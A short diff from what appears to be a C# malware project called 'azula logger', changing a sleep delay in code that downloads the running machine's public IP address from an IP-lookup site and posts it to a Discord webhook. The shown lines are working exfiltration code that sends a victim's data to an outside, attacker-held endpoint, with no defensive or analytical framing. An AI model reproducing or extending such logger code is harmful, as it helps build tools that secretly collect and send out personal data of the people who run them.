@@ -22,7 +22,7 @@ namespace azula_logger
                 string IP = webclient.DownloadString("http://wtfismyip.com/text");
                 //Sending the ip throught the webhook
                 websend.sendDiscordWebhook(webhook, "azula logger", "IP: \n" + IP + "-------------------------", image);
-                Thread.Sleep(850);
+                Thread.Sleep(100);
 
             }
             }
